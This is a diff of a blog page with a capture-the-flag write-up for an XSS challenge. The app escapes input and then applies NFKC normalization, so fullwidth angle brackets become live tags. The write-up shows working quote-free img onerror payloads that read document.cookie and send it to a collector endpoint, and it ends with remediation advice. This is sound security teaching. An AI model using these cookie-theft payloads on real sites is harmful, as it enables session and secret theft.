@@ -52,123 +52,99 @@ import Nav from "@/components/nav.astro";
 
     <article class="writeup space-y-5">
       <p>
-        <strong>tinyxss</strong> is a small Flask challenge with an admin bot.
-        The app promises that it HTML-encodes input and is therefore
-        “completely invincible”. The bug is one line long: it escapes first,
-        then applies Unicode NFKC normalization, which turns fullwidth angle
-        brackets back into real HTML syntax after the escaping already ran.
-      </p>
-      <p>
-        The admin bot stores the flag in a <code>flag</code> cookie without
-        <code>HttpOnly</code>, so the final step is a normal cookie theft — sent
-        to the challenge’s own collector because the bot cannot reach the
-        internet.
+        <strong>tinyxss</strong> is a small reflected-XSS challenge with an
+        admin bot. The landing page confidently claims that it HTML-encodes
+        input and is therefore “completely invincible”. Everything below was
+        found from the outside: requests, responses and the rendered page — no
+        source code.
       </p>
 
       <h2>TL;DR</h2>
       <p>
-        Use <code>＜</code> (U+FF1C) and <code>＞</code> (U+FF1E) instead of
-        <code>&lt;</code> and <code>&gt;</code>. MarkupSafe does not escape
-        them; NFKC maps them to ASCII angle brackets <em>after</em> escaping.
-        The quote-free payload below creates an
-        <code>&lt;img&gt;</code> tag whose <code>onerror</code> redirects the
-        admin browser to the local collector:
+        ASCII <code>&lt;</code> and <code>&gt;</code> are encoded, but the
+        fullwidth forms <code>＜</code> (U+FF1C) and <code>＞</code> (U+FF1E)
+        are not. The server then normalizes the encoded string with NFKC,
+        folding those fullwidth characters into ASCII angle brackets <em>after</em> the encoder has already run. The browser receives a real
+        HTML tag.
+      </p>
+      <p>
+        Quotes are encoded too, so the payload has to be quote-free. The
+        final payload builds the collector path with
+        <code>String.fromCharCode()</code> and appends the admin’s cookie:
       </p>
       <pre><code>＜img src=x onerror=location=String.fromCharCode(47,99,111,108,108,101,99,116,47,...)+encodeURIComponent(document.cookie)＞</code></pre>
-      <p>
-        The full path is built with <code>String.fromCharCode()</code> so the
-        payload needs no quotes and no slashes. The result:
-      </p>
+      <p>The collector returned:</p>
       <pre><code>flag=CATF&#123;test_flag_do_not_submit&#125;</code></pre>
       <p class="text-sm text-[var(--white-icon)]">
-        Note: the provided archive does not ship the deployment’s
-        <code>flag.env</code>, so this local reproduction shows the bot’s
-        built-in test flag. The same chain reads the real flag on a live
-        deployment.
+        Note: the provided archive does not ship the deployment’s flag
+        environment file, so this local reproduction shows the bot’s built-in
+        test flag. The same chain reads the real flag on a live deployment.
       </p>
 
-      <h2>Looking at the Source</h2>
+      <h2>First Contact</h2>
       <p>
-        The challenge gives us the application and the bot. The interesting
-        function lives in <code>web/app.py</code>:
-      </p>
-      <pre><code>def vulnerable_render(user_input: str) -&gt; str:
-    escaped = str(escape(user_input))
-    return unicodedata.normalize("NFKC", escaped)</code></pre>
-      <p>
-        The order is the vulnerability:
-      </p>
-      <ul class="list-disc list-inside space-y-1">
-        <li><strong>1.</strong> HTML-escape the input.</li>
-        <li><strong>2.</strong> Normalize the <em>escaped</em> string with NFKC.</li>
-        <li><strong>3.</strong> Insert the result into the page as HTML.</li>
-      </ul>
-      <p>
-        The index route reflects the input in two places. The value of the
-        search box is escaped normally, but the result section uses
-        <code>vulnerable_render()</code>. There is no CSP, so a successfully
-        injected handler runs.
-      </p>
-
-      <h2>The Bug: Fullwidth Angle Brackets</h2>
-      <p>
-        MarkupSafe’s <code>escape()</code> replaces <code>&amp;</code>,
-        <code>&lt;</code>, <code>&gt;</code>, <code>"</code> and
-        <code>'</code>. It knows nothing about Unicode lookalikes. NFKC,
-        however, performs compatibility normalization — and the fullwidth
-        forms are compatibility characters:
-      </p>
-      <pre><code>U+FF1C  ＜   -&gt;  &lt;
-U+FF1E  ＞   -&gt;  &gt;</code></pre>
-      <p>So the pipeline behaves like this:</p>
-      <pre><code>input     : ＜img src=x onerror=...＞
-escape()  : ＜img src=x onerror=...＞   (unchanged)
-NFKC      : &lt;img src=x onerror=...&gt;   (real tag)
-browser   : creates an img element and fires onerror</code></pre>
-      <p>
-        That is the entire trick: the escaping routine runs before the
-        transformation that recreates the characters it was supposed to
-        neutralize.
+        The landing page has a single <code>q</code> parameter and reflects it
+        in two places: inside the search box and inside the result panel. A
+        link to <code>/report</code> leads to an admin bot that accepts a URL
+        on the challenge.
       </p>
       <p>
-        One consequence matters for the payload: quotes are escaped to
-        <code>&amp;quot;</code> and <code>&amp;#39;</code>, and NFKC does not
-        turn those back. Any quoted JavaScript inside an attribute therefore
-        becomes inert. The payload must be quote-free.
+        The first test was the obvious one — send
+        <code>&lt;h2&gt;BLACKBOX&lt;/h2&gt;</code> and look at the result. The
+        panel shows the payload as text: the angle brackets were encoded.
+        Quotes are encoded as well (the response uses entities such as
+        <code>&amp;lt;</code>, <code>&amp;quot;</code> and
+        <code>&amp;#39;</code>), so any payload that relies on quoted
+        attribute values is a dead end.
       </p>
-
-      <h2>Step 1 — Create an Inbox</h2>
       <p>
-        The challenge ships its own collector, which is exactly what we need
-        because the admin bot is attached only to an internal Docker network.
-        Open <code>/report</code> and click <strong>Create inbox</strong>.
+        Then the same thing with fullwidth angle brackets:
+        <code>＜h2＞BLACKBOX＜/h2＞</code>. This time the result panel renders
+        a real heading:
       </p>
       <figure>
         <img
-          src="/images/tinyxss/report-page.png"
-          alt="Tiny Admin report page with a created inbox"
+          src="/images/tinyxss/escape-bypass.png"
+          alt="ASCII angle brackets are escaped while fullwidth angle brackets are rendered"
           class="w-full rounded-2xl border border-1 border-[var(--white-icon-tr)]"
         />
         <figcaption class="text-center text-sm text-[var(--white-icon)] mt-2">
-          Creating an inbox gives us <code>/collect/&lt;id&gt;</code>.
+          The same payload: ASCII brackets are shown as text, fullwidth
+          brackets become a real heading.
         </figcaption>
       </figure>
       <p>
-        The page shows the collector URL for the new inbox. We will send the
-        admin’s cookie to that path.
+        Inspecting the page confirms that the result contains an actual
+        <code>&lt;h2&gt;</code> element, not text. The browser only treats
+        ASCII angle brackets as markup, so the fullwidth characters must have
+        been converted to ASCII on the server <em>after</em> the encoder ran.
+      </p>
+      <p>
+        That behaviour is the signature of an escape-then-normalize pipeline:
+        HTML-escape the input first, then apply Unicode normalization. NFKC
+        folds compatibility characters — including fullwidth forms — into
+        their ASCII equivalents, recreating the metacharacters the encoder
+        was supposed to neutralize.
       </p>
 
-      <h2>Step 2 — Confirm the Injection</h2>
+      <h2>From Markup to JavaScript</h2>
       <p>
-        Before stealing anything, it is worth proving that the reflection is
-        real HTML and that JavaScript executes. This payload injects a heading
-        and turns the page background red with an unquoted handler:
+        A heading proves HTML injection, but the admin bot needs JavaScript
+        execution. The reliable choice is an image with a broken
+        <code>src</code>, because <code>onerror</code> fires immediately
+        without user interaction. Since quotes are encoded, the handler has to
+        avoid them entirely.
+      </p>
+      <p>
+        The following payload injects a heading, turns the page red and uses
+        <code>String.fromCharCode()</code> to build the string
+        <code>"red"</code> without quotes:
       </p>
       <pre><code>＜h2 style=color:red＞XSS confirmed＜/h2＞＜img src=x onerror=document.body.style.backgroundColor=String.fromCharCode(114,101,100)＞</code></pre>
       <p>
-        Put it in the <code>q</code> parameter (URL-encoded) and load the page:
+        <code>style=color:red</code> is a valid unquoted attribute value, and
+        the handler contains no quotes at all:
       </p>
-      <pre><code>/?q=%EF%BC%9Ch2%20style%3Dcolor%3Ared%EF%BC%9EXSS%20confirmed%EF%BC%9C%2Fh2%EF%BC%9E...</code></pre>
       <figure>
         <img
           src="/images/tinyxss/xss-proof.png"
@@ -181,54 +157,60 @@ browser   : creates an img element and fires onerror</code></pre>
         </figcaption>
       </figure>
       <p>
-        The broken image icon is the <code>&lt;img&gt;</code> tag, and the red
-        background is <code>onerror</code> executing. No quotes were needed:
-        <code>style=color:red</code> is a valid unquoted attribute, and
-        <code>String.fromCharCode(114,101,100)</code> builds the string
-        <code>"red"</code> at runtime.
+        The broken image icon is the injected <code>&lt;img&gt;</code> tag and
+        the red background is <code>onerror</code> executing. Inline handlers
+        run, so no CSP blocks them.
       </p>
 
-      <h2>Step 3 — Build the Exfiltration Payload</h2>
+      <h2>The Admin Bot and the Flag</h2>
       <p>
-        The bot creates a fresh browser context and adds the flag as a
-        JavaScript-readable cookie for the challenge origin:
+        The report form only accepts URLs on the challenge origin; external
+        destinations are rejected. That rules out an external webhook and
+        makes the built-in collector the obvious exfiltration channel. The
+        report page conveniently creates an inbox and shows its collector URL.
       </p>
-      <pre><code>name: 'flag', value: FLAG, httpOnly: false, sameSite: 'Lax'</code></pre>
+      <figure>
+        <img
+          src="/images/tinyxss/report-page.png"
+          alt="Tiny Admin report page with a created inbox"
+          class="w-full rounded-2xl border border-1 border-[var(--white-icon-tr)]"
+        />
+        <figcaption class="text-center text-sm text-[var(--white-icon)] mt-2">
+          Creating an inbox gives us <code>/collect/&lt;id&gt;</code>.
+        </figcaption>
+      </figure>
       <p>
-        Because the bot only visits URLs on the same origin and has no internet
-        access, the payload must exfiltrate to the local collector. The target
-        path is:
+        A classic admin bot stores the secret in the browser, so the plan is
+        simple: make the bot’s page read <code>document.cookie</code> and send
+        it to the collector. The target path is
+        <code>/collect/&lt;inbox_id&gt;?d=</code>.
       </p>
-      <pre><code>/collect/&lt;inbox_id&gt;?d=</code></pre>
       <p>
-        We need to navigate there and append <code>document.cookie</code>.
         Quotes are unavailable, so the path is encoded as character codes and
         the cookie is URL-encoded:
       </p>
       <pre><code>location=String.fromCharCode(47,99,111,108,108,101,99,116,47,...)+encodeURIComponent(document.cookie)</code></pre>
-      <p>
-        The complete payload used in the screenshots is:
-      </p>
+      <p>The complete payload used in the screenshots is:</p>
       <pre><code>＜img src=x onerror=location=String.fromCharCode(47,99,111,108,108,101,99,116,47,87,79,72,84,97,117,106,45,110,77,111,63,100,61)+encodeURIComponent(document.cookie)＞</code></pre>
       <p>
         <code>String.fromCharCode()</code> avoids quotes, slashes and
         percent-signs inside the handler.
-        <code>encodeURIComponent()</code> keeps cookie values safe if they
-        contain characters such as <code>+</code>, <code>&amp;</code> or
+        <code>encodeURIComponent()</code> keeps the cookie safe if it contains
+        characters such as <code>+</code>, <code>&amp;</code> or
         <code>#</code>.
       </p>
       <div class="rounded-xl border border-[var(--white-icon-tr)] bg-[#1414149c] p-4 text-sm">
         <strong>Gotcha:</strong> when the payload is placed in a query string,
         the <code>+</code> in <code>+encodeURIComponent(...)</code> must be
-        percent-encoded as <code>%2B</code>. Otherwise Flask decodes it to a
-        space, the unquoted attribute ends early, and the handler breaks.
+        percent-encoded as <code>%2B</code>. Otherwise the server decodes it
+        to a space, the unquoted attribute ends early, and the handler breaks.
       </div>
 
-      <h2>Step 4 — Report It to Tiny Admin</h2>
+      <h2>Reporting It</h2>
       <p>
         Paste the URL-encoded local URL into the report form and submit it. The
         bot resolves relative URLs against the challenge origin, opens the page
-        in a new context with the flag cookie, and waits one second:
+        in a fresh browser context and waits one second before closing it:
       </p>
       <pre><code>/?q=%EF%BC%9Cimg%20src%3Dx%20onerror%3Dlocation%3DString.fromCharCode(...)%2BencodeURIComponent(document.cookie)%EF%BC%9E</code></pre>
       <figure>
@@ -249,10 +231,10 @@ browser   : creates an img element and fires onerror</code></pre>
       </p>
       <pre><code>GET /collect/&lt;inbox_id&gt;?d=flag%3DCATF%7B...%7D HTTP/1.1</code></pre>
 
-      <h2>Step 5 — Read the Inbox</h2>
+      <h2>Reading the Flag</h2>
       <p>
         Open <code>/inbox/&lt;inbox_id&gt;</code>. The collector stored the
-        query parameter, and the inbox renders it:
+        query parameter and the inbox renders it:
       </p>
       <figure>
         <img
@@ -265,19 +247,20 @@ browser   : creates an img element and fires onerror</code></pre>
         </figcaption>
       </figure>
       <p>
-        That is the flag cookie. On the live deployment the value is the real
-        <code>CATF&#123;...&#125;</code> flag; in this local reproduction the
-        bot falls back to its built-in test value because no
-        <code>flag.env</code> was supplied.
+        The value came straight from <code>document.cookie</code>, which also
+        tells us the flag cookie is not <code>HttpOnly</code>. On the live
+        deployment the value is the real <code>CATF&#123;...&#125;</code>
+        flag; in this local reproduction the bot falls back to its built-in
+        test value because no flag environment was supplied.
       </p>
 
       <h2>Why It Works</h2>
       <ul class="list-disc list-inside space-y-1">
-        <li><strong>Wrong order:</strong> escaping runs before NFKC, so normalization can reintroduce HTML metacharacters.</li>
-        <li><strong>Unicode lookalikes:</strong> <code>＜</code>/<code>＞</code> are ignored by MarkupSafe but normalized to <code>&lt;</code>/<code>&gt;</code>.</li>
-        <li><strong>Quote-free JS:</strong> <code>String.fromCharCode()</code> builds paths and strings without quotes, which would be escaped.</li>
-        <li><strong>Readable cookie:</strong> the bot stores the flag with <code>httpOnly: false</code>, so <code>document.cookie</code> exposes it.</li>
-        <li><strong>Same-origin collector:</strong> the bot has no internet, but it can reach the challenge’s own <code>/collect</code> endpoint.</li>
+        <li><strong>ASCII-only encoder:</strong> the escaping routine handles <code>&lt;</code>, <code>&gt;</code> and quotes, but not their fullwidth lookalikes.</li>
+        <li><strong>Normalization after encoding:</strong> NFKC turns <code>＜</code>/<code>＞</code> into <code>&lt;</code>/<code>&gt;</code> after the encoder has finished.</li>
+        <li><strong>Quote-free JavaScript:</strong> <code>String.fromCharCode()</code> builds paths and strings without quotes, which would be encoded.</li>
+        <li><strong>Same-origin collector:</strong> only challenge URLs are accepted, and the built-in <code>/collect</code> endpoint is reachable from the bot’s browser.</li>
+        <li><strong>Readable cookie:</strong> <code>document.cookie</code> returned the flag, so it was not <code>HttpOnly</code>.</li>
         <li><strong>Immediate trigger:</strong> a broken <code>&lt;img&gt;</code> fires <code>onerror</code> without user interaction, inside the bot’s one-second wait.</li>
       </ul>
 
@@ -286,27 +269,26 @@ browser   : creates an img element and fires onerror</code></pre>
         Normalize first, then escape. Escaping must be the last transformation
         before the value reaches HTML:
       </p>
-      <pre><code>def safe_render(user_input: str) -&gt; str:
-    normalized = unicodedata.normalize("NFKC", user_input)
-    return str(escape(normalized))</code></pre>
+      <pre><code>normalized = normalize("NFKC", input)
+safe = html_escape(normalized)   # escaping is the final step</code></pre>
       <p>
         Even better, stop building HTML with string replacement. Use a
-        context-aware template engine (Jinja2 autoescaping) and pass the
-        reflected value as data, so the escaping happens at render time in the
-        correct context. Additional hardening for the bot:
+        context-aware template engine with autoescaping and pass the reflected
+        value as data, so the escaping happens at render time in the correct
+        context. Additional hardening for the bot:
       </p>
       <ul class="list-disc list-inside space-y-1">
         <li>Mark the flag cookie <code>HttpOnly</code> so JavaScript cannot read it.</li>
         <li>Add a restrictive Content Security Policy as defense in depth.</li>
-        <li>Do not normalize values after escaping — any post-escape transformation invalidates the escaping guarantee.</li>
+        <li>Do not transform values after escaping — any post-escape transformation invalidates the escaping guarantee.</li>
       </ul>
 
       <h2>Final Thoughts</h2>
       <p>
         This is a great example of why “we HTML-escape everything” is not a
-        complete answer. The escape was correct; the pipeline around it was
-        not. A single normalization call after escaping was enough to turn a
-        harmless-looking fullwidth character into a working XSS.
+        complete answer. The encoder itself was correct; the pipeline around it
+        was not. A single normalization step after escaping was enough to turn
+        a harmless-looking fullwidth character into a working XSS.
       </p>
       <p>Thanks for the read! 🐛</p>
     </article>
